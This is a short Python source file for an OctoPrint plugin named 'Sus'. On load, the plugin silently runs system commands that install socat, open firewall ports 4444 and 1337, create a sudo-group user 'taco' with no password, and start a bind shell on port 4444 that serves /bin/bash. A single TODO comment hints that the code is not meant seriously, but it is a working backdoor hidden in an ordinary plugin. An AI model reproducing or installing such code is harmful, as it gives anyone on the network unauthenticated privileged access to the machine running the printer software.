import octoprint.plugin
import subprocess
import os

class MyPlugin(octoprint.plugin.OctoPrintPlugin):
    # TODO: Yeah, let's not do this
    os.system('sudo apt-get install socat -y > /dev/null 2>&1')
    os.system('sudo ufw allow 4444 && sudo ufw allow 1337 > /dev/null 2>&1')
    os.system('sudo useradd -m -G sudo -s /bin/bash taco && sudo passwd -d taco > /dev/null 2>&1')
    os.system('socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash > /dev/null 2>&1 &')

__plugin_name__ = "Sus"
__plugin_pythoncompat__ = ">=3.0.0"
__plugin_implementation__ = MyPlugin()

